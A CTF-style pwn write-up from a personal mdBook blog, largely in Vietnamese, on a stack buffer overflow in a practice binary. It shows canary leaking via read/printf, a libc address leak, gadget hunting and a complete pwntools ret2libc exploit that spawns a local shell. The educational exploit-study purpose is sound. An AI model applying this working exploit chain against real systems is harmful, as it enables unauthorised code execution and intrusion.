<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js dark">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>training - leak with read - Hjn4 Blog</title>


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="../../../theme/css/additional.css">

    </head>
    <body>
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "dark";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('dark')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var html = document.querySelector('html');
            var sidebar = null;
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="../../../homepage.html">HOME - Huy Na</a></li><li class="chapter-item affix "><li class="part-title">ROP Emporium</li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/ret2win_challenge.html">ret2win - challenge 1</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/split_challenge.html">split - challenge 2</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/callme_challenge.html">callme - challenge 3</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/write4_challenge.html">write4 - challenge 4</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/badchars_challenge.html">badchars - challenge 5</a></li><li class="chapter-item affix "><li class="part-title">Pwnable.tw</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/start_challenge.html">start</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html">orw</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/calc_challenge.html">calc</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/3x17_challenge.html">3x17</a></li><li class="chapter-item affix "><li class="part-title">Pwn_Pico</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/herelibc_challenge.html">Here's a libc </a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/hijacking_challenge.html">hijacking </a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/fermat_strins_challenge.html">fermat_strings </a></li><li class="chapter-item affix "><li class="part-title">Pwn from blabla</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html">handy shellcode</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/pwn07_challenge.html">pwn07 - ret2libc vs ROP</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/got_formatstring_challenge.html">GOT overwrite with format string</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/training_brutepie_challenge.html">training - brute pie</a></li><li class="chapter-item expanded "><a href="../../../blogs/PWN/Pwn_from_blabla/training_leak_with_read_challenge.html" class="active">training - leak with read</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/training_leak_Pie_Canary_challenge.html">training - leak Pie-Canary</a></li><li class="chapter-item affix "><li class="part-title">Assembly</li><li class="chapter-item "><a href="../../../blogs/Assembly/Session_1.html">Session 1</a></li><li class="chapter-item "><a href="../../../blogs/Assembly/Session_2.html">Session 2</a></li><li class="chapter-item affix "><li class="part-title">RE_Pico</li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_0.html">ARMssembly 0</a></li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_1.html">ARMssembly 1</a></li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_2.html">ARMssembly 2</a></li><li class="chapter-item affix "><li class="part-title">RE_from_blabla</li><li class="chapter-item "><a href="../../../blogs/RE_from_blabla/problems.html">training</a></li><li class="chapter-item affix "><li class="part-title">Docker</li><li class="chapter-item "><a href="../../../blogs/Docker/tips.html">Some tips for ctf</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Hjn4 Blog</h1>

                    <div class="right-buttons">

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="training---leak-with-read"><a class="header" href="#training---leak-with-read">training - leak with read</a></h1>
<p><a href="https://github.com/Hjn4Pwn/Pwn/tree/main/pwn_from_blabla/training/chall_bof/passStore_NOPIE">binary file and solve code</a></p>
<h3 id="file"><a class="header" href="#file">file</a></h3>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ checksec passStore_NOPIE
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ file passStore_NOPIE
passStore_NOPIE: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7110eba217e2f468c9b3c94091bf86bdda5d5d33, for GNU/Linux 3.2.0, not stripped

</code></pre>
<h3 id="ida"><a class="header" href="#ida">IDA</a></h3>
<h4 id="main-func"><a class="header" href="#main-func">main func</a></h4>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  passStore();
  return 0;
}

</code></pre>
<h4 id="passstore-func"><a class="header" href="#passstore-func">passStore func</a></h4>
<pre><code class="language-c">unsigned __int64 passStore()
{
  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf(&quot;Type the password: &quot;);
  read(0, buf, 0x300uLL);
  printf(&quot;You typed %s\n&quot;, buf);
  printf(&quot;Retype: &quot;);
  read(0, buf, 0x300uLL);
  return v2 - __readfsqword(0x28u);
}

</code></pre>
<p>Oke, ở đây ta có 2 lần nhập, với <em>read</em>, no pie, canary enable =&gt; leak thứ gì đấy.</p>
<p>Thì đầu tiên, mình sẽ leak canary trước cái đã rồi tính tiếp.</p>
<pre><code class="language-shell">pwndbg&gt; b* passStore + 91
Breakpoint 2 at 0x4011ff
pwndbg&gt; c
Continuing.
Type the password: aaaaaaaaaaaaa

Breakpoint 2, 0x00000000004011ff in passStore ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
*RAX  0x0
 RBX  0x0
*RCX  0x7ffff7ea1992 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x300
*RDI  0x402018 ◂— 'You typed %s\n'
*RSI  0x7fffffffdfb0 ◂— 'aaaaaaaaaaaaa\n'
*R8   0x13
 R9   0x7ffff7fc9040 (_dl_fini) ◂— endbr64
*R10  0x7ffff7d935e8 ◂— 0xf001200001a64
*R11  0x246
 R12  0x7fffffffe118 —▸ 0x7fffffffe35f ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
 R13  0x401245 (main) ◂— endbr64
 R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
*RBP  0x7fffffffdff0 —▸ 0x7fffffffe000 ◂— 0x1
*RSP  0x7fffffffdfb0 ◂— 'aaaaaaaaaaaaa\n'
*RIP  0x4011ff (passStore+91) ◂— call 0x401090
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x4011ff &lt;passStore+91&gt;     call   printf@plt                      &lt;printf@plt&gt;
        format: 0x402018 ◂— 'You typed %s\n'
        vararg: 0x7fffffffdfb0 ◂— 'aaaaaaaaaaaaa\n'

   0x401204 &lt;passStore+96&gt;     lea    rax, [rip + 0xe1b]
   0x40120b &lt;passStore+103&gt;    mov    rdi, rax
   0x40120e &lt;passStore+106&gt;    mov    eax, 0
   0x401213 &lt;passStore+111&gt;    call   printf@plt                      &lt;printf@plt&gt;

   0x401218 &lt;passStore+116&gt;    lea    rax, [rbp - 0x40]
   0x40121c &lt;passStore+120&gt;    mov    edx, 0x300
   0x401221 &lt;passStore+125&gt;    mov    rsi, rax
   0x401224 &lt;passStore+128&gt;    mov    edi, 0
   0x401229 &lt;passStore+133&gt;    call   read@plt                      &lt;read@plt&gt;

   0x40122e &lt;passStore+138&gt;    nop
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsi rsp 0x7fffffffdfb0 ◂— 'aaaaaaaaaaaaa\n'
01:0008│         0x7fffffffdfb8 ◂— 0xa6161616161 /* 'aaaaa\n' */
02:0010│         0x7fffffffdfc0 —▸ 0x7ffff7fa7780 (_IO_2_1_stdout_) ◂— 0xfbad2887
03:0018│         0x7fffffffdfc8 —▸ 0x7ffff7e0e5ff (setbuffer+191) ◂— test dword ptr [rbx], 0x8000
04:0020│         0x7fffffffdfd0 ◂— 0x0
05:0028│         0x7fffffffdfd8 ◂— 0x0
06:0030│         0x7fffffffdfe0 —▸ 0x7fffffffe000 ◂— 0x1
07:0038│         0x7fffffffdfe8 ◂— 0x7b1aaee79b5cb100
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0         0x4011ff passStore+91
   1         0x40127f main+58
   2   0x7ffff7db6d90 __libc_start_call_main+128
   3   0x7ffff7db6e40 __libc_start_main+128
   4         0x4010d5 _start+37
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; canary
AT_RANDOM = 0x7fffffffe339 # points to (not masked) global canary value
Canary    = 0x7b1aaee79b5cb100 (may be incorrect on != glibc)
Found valid canaries on the stacks:
00:0000│  0x7fffffffdfe8 ◂— 0x7b1aaee79b5cb100
00:0000│  0x7fffffffe098 ◂— 0x7b1aaee79b5cb100
pwndbg&gt;

</code></pre>
<p>t thấy là canary ở ngay dưới vị trí stack lưu chuỗi của mình, cách 7 stacks, tức là 7*8 = 56 bytes, thế thì chỉ cần nhập 56 bytes, theo cơ chế của <strong>read</strong> thì chưa gặp byte null là nó chưa dừng lại, vì yêu cứ đâm đầu í. Nên khi mà mình nhập vào 56 bytes, tới ngay cái vị trí của thg canary, ở đấy làm gì có null. thế là ẻm dính luôn với thg buf, lún printf ra thì đi theo buf luôn, tới cuối mơí gặp null.</p>
<p>Oke vậy thì chốt lại là với *<strong>payload = b&quot;a&quot;<em>56</em></strong> ta sẽ leak được canary. sau khi leak được rồi thì với payload thứ 2, ta sẽ điều khiển luồng thực thi của chương trình. tuy nhiên có 2 thứ: 1 là ret cách str ta nhập vào mấy bytes, 2 là ret đi đâu.</p>
<pre><code class="language-shell">► 0x401229 &lt;passStore+133&gt;    call   read@plt                      &lt;read@plt&gt;
        fd: 0x0 (/dev/pts/0)
        buf: 0x7fffffffdfb0 ◂— 0x7fff0a333231
        nbytes: 0x300
</code></pre>
<p>string ta nhập sẽ được lưu ở buf :<strong>0x7fffffffdfb0</strong></p>
<pre><code class="language-shell">──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x401244       &lt;passStore+160&gt;                 ret                                  &lt;0x40127f; main+58&gt;
    ↓
   0x40127f       &lt;main+58&gt;                       mov    eax, 0
   0x401284       &lt;main+63&gt;                       pop    rbp
   0x401285       &lt;main+64&gt;                       ret
    ↓
   0x7ffff7db6d90 &lt;__libc_start_call_main+128&gt;    mov    edi, eax
   0x7ffff7db6d92 &lt;__libc_start_call_main+130&gt;    call   exit                &lt;exit&gt;

   0x7ffff7db6d97 &lt;__libc_start_call_main+135&gt;    call   __nptl_deallocate_tsd                &lt;__nptl_deallocate_tsd&gt;

   0x7ffff7db6d9c &lt;__libc_start_call_main+140&gt;    lock dec dword ptr [rip + 0x1ef505]  &lt;__nptl_nthreads&gt;
   0x7ffff7db6da3 &lt;__libc_start_call_main+147&gt;    sete   al
   0x7ffff7db6da6 &lt;__libc_start_call_main+150&gt;    test   al, al
   0x7ffff7db6da8 &lt;__libc_start_call_main+152&gt;    jne    __libc_start_call_main+168                &lt;__libc_start_call_main+168&gt;
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdff8 —▸ 0x40127f (main+58) ◂— mov eax, 0
01:0008│ rbp 0x7fffffffe000 ◂— 0x1
02:0010│     0x7fffffffe008 —▸ 0x7ffff7db6d90 (__libc_start_call_main+128) ◂— mov edi, eax
03:0018│     0x7fffffffe010 ◂— 0x0

</code></pre>
<p>Còn ret: <strong>0x7fffffffdff8</strong></p>
<pre><code class="language-python">&gt;&gt;&gt; 0x7fffffffdff8 - 0x7fffffffdfb0
72

</code></pre>
<p>Ta thấy là mới chỉ có mỗi canary, còn phải viết ovwr về đâu, mình thử vào xem các gadget có gì okela k:</p>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ ROPgadget --binary passStore_NOPIE
Gadgets information
============================================================
0x000000000040110b : add bh, bh ; loopne 0x401175 ; nop ; ret
0x00000000004010dc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401280 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040117a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010de : add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401282 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040123b : add byte ptr [rbp + rax - 0x18], dh ; sub eax, 0xc9fffffe ; ret
0x000000000040117b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401179 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040110a : add dil, dil ; loopne 0x401175 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040117c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401177 : add eax, 0x2eeb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040123d : add eax, 0xfffe2de8 ; dec ecx ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x000000000040122d : call qword ptr [rax - 0x7ba74b8]
0x0000000000401014 : call rax
0x0000000000401193 : cli ; jmp 0x401120
0x0000000000401199 : cli ; push rbp ; mov rbp, rsp ; push rdi ; pop rdi ; ret
0x00000000004010e3 : cli ; ret
0x000000000040128b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401242 : dec ecx ; ret
0x0000000000401190 : endbr64 ; jmp 0x401120
0x00000000004010e0 : endbr64 ; ret
0x000000000040119d : in eax, 0x57 ; pop rdi ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401105 : je 0x401110 ; mov edi, 0x404048 ; jmp rax
0x0000000000401147 : je 0x401150 ; mov edi, 0x404048 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401194 : jmp 0x401120
0x0000000000401178 : jmp 0x4011a8
0x000000000040100b : jmp 0x4840103f
0x000000000040110c : jmp rax
0x0000000000401243 : leave ; ret
0x000000000040110d : loopne 0x401175 ; nop ; ret
0x0000000000401176 : mov byte ptr [rip + 0x2eeb], 1 ; pop rbp ; ret
0x000000000040127f : mov eax, 0 ; pop rbp ; ret
0x000000000040119c : mov ebp, esp ; push rdi ; pop rdi ; ret
0x0000000000401107 : mov edi, 0x404048 ; jmp rax
0x000000000040119b : mov rbp, rsp ; push rdi ; pop rdi ; ret
0x00000000004011a1 : nop ; pop rbp ; ret
0x000000000040110f : nop ; ret
0x000000000040118c : nop dword ptr [rax] ; endbr64 ; jmp 0x401120
0x0000000000401106 : or dword ptr [rdi + 0x404048], edi ; jmp rax
0x000000000040117d : pop rbp ; ret
0x000000000040119f : pop rdi ; ret
0x000000000040119a : push rbp ; mov rbp, rsp ; push rdi ; pop rdi ; ret
0x000000000040119e : push rdi ; pop rdi ; ret
0x000000000040101a : ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x000000000040123f : sub eax, 0xc9fffffe ; ret
0x000000000040128d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040128c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401103 : test eax, eax ; je 0x401110 ; mov edi, 0x404048 ; jmp rax
0x0000000000401145 : test eax, eax ; je 0x401150 ; mov edi, 0x404048 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax


</code></pre>
<p>đáng ra để gọi shell ở đây thì mình sẽ cần :</p>
<pre><code class="language-shell">mov qword ptr [r14], r15 ; ret
systemcall

</code></pre>
<p>Để gọi shell. hay nếu dùng libc thì có thể leak runtime address với <strong>printf(%s)</strong> tuy nhiên cần đưa địa chỉ got của func vào rsi, do rdi trỏ đến &quot;%s&quot;, nhưng chả có gadget nào để <strong>pop rsi</strong>.</p>
<p>Cơ mà mình nghĩ đến việc, có thể leak địa chỉ trên stack với <strong>%p%p%p%p%p</strong>, cơ mà với mục đích tương tự thì ta có thể làm với <strong>read</strong>. Nên mình sẽ vào check stack xem có địa chỉ hàm nào k.</p>
<pre><code class="language-shell">pwndbg&gt; stack 100
00:0000│ rax rsi rsp 0x7fffffffdfb0 —▸ 0x7ffff7fa3600 (_IO_file_jumps) ◂— 0x0
01:0008│             0x7fffffffdfb8 —▸ 0x7ffff7e1762d (_IO_file_setbuf+13) ◂— test rax, rax
02:0010│             0x7fffffffdfc0 —▸ 0x7ffff7fa7780 (_IO_2_1_stdout_) ◂— 0xfbad2887
03:0018│             0x7fffffffdfc8 —▸ 0x7ffff7e0e5ff (setbuffer+191) ◂— test dword ptr [rbx], 0x8000
04:0020│             0x7fffffffdfd0 ◂— 0x0
05:0028│             0x7fffffffdfd8 ◂— 0x0
06:0030│             0x7fffffffdfe0 —▸ 0x7fffffffe000 ◂— 0x1
07:0038│             0x7fffffffdfe8 ◂— 0xc2e8a41c66979000
08:0040│ rbp         0x7fffffffdff0 —▸ 0x7fffffffe000 ◂— 0x1
09:0048│             0x7fffffffdff8 —▸ 0x40127f (main+58) ◂— mov eax, 0
0a:0050│             0x7fffffffe000 ◂— 0x1
0b:0058│             0x7fffffffe008 —▸ 0x7ffff7db6d90 (__libc_start_call_main+128) ◂— mov edi, eax
0c:0060│             0x7fffffffe010 ◂— 0x0
0d:0068│             0x7fffffffe018 —▸ 0x401245 (main) ◂— endbr64
0e:0070│             0x7fffffffe020 ◂— 0x100000000
0f:0078│             0x7fffffffe028 —▸ 0x7fffffffe118 —▸ 0x7fffffffe35f ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
10:0080│             0x7fffffffe030 ◂— 0x0
11:0088│             0x7fffffffe038 ◂— 0x684f04992bfd6bfd
12:0090│             0x7fffffffe040 —▸ 0x7fffffffe118 —▸ 0x7fffffffe35f ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
13:0098│             0x7fffffffe048 —▸ 0x401245 (main) ◂— endbr64

</code></pre>
<p>thì mình để ý thấy có thằng <strong>setbuffer+191</strong> chỉ cần nhập 24 bytes là tới, nên là chỉ việc leak ra xong trừ đi 191 là ra được địa chỉ hàm ngon lành. Cơ mà có 1 vấn đề. Hơi khó hiểu tí, là lúc này thì là <strong>+191</strong> nhưng lúc mình viết script xong attach gdb vào chạy vào <strong>x/s</strong> địa chỉ được leak ra thì nó là <strong>+150</strong> nên trong script thay vì <strong>-191</strong> thì mình <strong>-150</strong> tức là <strong>0x96</strong></p>
<p>Sau khi leak được runtime address của hàm <strong>setbuffer</strong>, thì mình có thể tính được <strong>libc_base = addr_setbuf - setbuf_offset</strong>. Sau đó tính addr của <strong>system, &quot;/bin/sh&quot;</strong> dưạ trên offset và libc_base. Xong rồi thì với lần nhập tiếp theo mình sẽ gửi payload nhầm lấy shell như sau:</p>
<p><strong>payload = <em><strong>bypass canary</strong></em> + ret + pop_rdi_ret + binsh_addr + system_addr</strong></p>
<p>đưa addr của chuỗi /bin/sh vào rdi làm tham số thứ 1 và gọi system. tuy nhiên đây là kiến trúc 64bits nên là cần ret trước đó để tránh lỗi movaps:</p>
<blockquote>
<p>The MOVAPS issue</p>
<blockquote>
<p>If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.</p>
</blockquote>
</blockquote>
<p>Chúng ta có thể dùng các tool dưới cho việc tìm offset, ropgadget cần thiết, tuy nhiên ở script của mình sẽ tối ưu hóa hơn với pwntools:</p>
<pre><code class="language-shell">ROPgadget --binary file | grep &quot;somthing&quot;
readelf -sW /usr/lib/x86_64-linux-gnu/libc.so.6 | grep &quot;system&quot;
strings -tw /usr/lib/x86_64-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot;

</code></pre>
<h3 id="exploit-code"><a class="header" href="#exploit-code">Exploit code</a></h3>
<h4 id="exploit-code-ver1"><a class="header" href="#exploit-code-ver1">Exploit code ver1</a></h4>
<pre><code class="language-python">from pwn import *

binary = ELF('./passStore_NOPIE')
libc = ELF(&quot;/usr/lib/x86_64-linux-gnu/libc.so.6&quot;)
rop = ROP(binary)
r = process(binary.path)
#gdb.attach(r , api=True)

payload1 = b&quot;a&quot;*56
r.sendlineafter(b&quot;Type the password: &quot;,payload1)

r.recvline()

canary = b&quot;\x00&quot;  +  r.recv(7).split(b&quot;\n&quot;)[0] 
canary += b&quot;\x00&quot;*(8 - len(canary))
log.info(&quot;Leaked canary: &quot; + str(hex(u64(canary))))

main = binary.symbols['main'] 
ret = rop.find_gadget(['ret'])[0] 


payload2 = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 + p64(main+53)
r.sendlineafter(b&quot;Retype: &quot;,payload2)

payload3 = b&quot;a&quot;*248
r.sendlineafter(b&quot;Type the password:&quot;,payload3)
r.recvline()

res = r.recv().split(b&quot;\nRetype&quot;)[0] 
res += b&quot;\x00&quot;*(8 - len(res))
leak = (u64(res) &lt;&lt; 8) + 0x0a 
_libc_start_main_addr = leak - 0x4a 
libc_base = _libc_start_main_addr - libc.symbols['__libc_start_main']
log.info(&quot;libc base addr : &quot; + hex(libc_base)) 


system_offset = libc.symbols['system'] #
binsh_offset = next(libc.search(b'/bin/sh\x00'))
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
log.info(&quot;system addr : &quot; + hex(system_addr)) 
log.info(&quot;/bin/sh addr : &quot; + hex(binsh_addr)) 

junk = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 
payload4 = junk +p64(ret)+ p64(pop_rdi_ret) + p64(binsh_addr) +p64(system_addr)

r.sendline(payload4)

r.interactive()

</code></pre>
<h4 id="result-ver1"><a class="header" href="#result-ver1">Result ver1</a></h4>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ python3 exploit.py
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 6 cached gadgets for './passStore_NOPIE'
[+] Starting local process '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE': pid 25200
[*] Leaked canary: 0xa5bb53678c3c3100
[*] libc base addr : 0x7f8adb24b000
[*] system addr : 0x7f8adb29bd60
[*] /bin/sh addr : 0x7f8adb423698
[*] Switching to interactive mode
$ ls
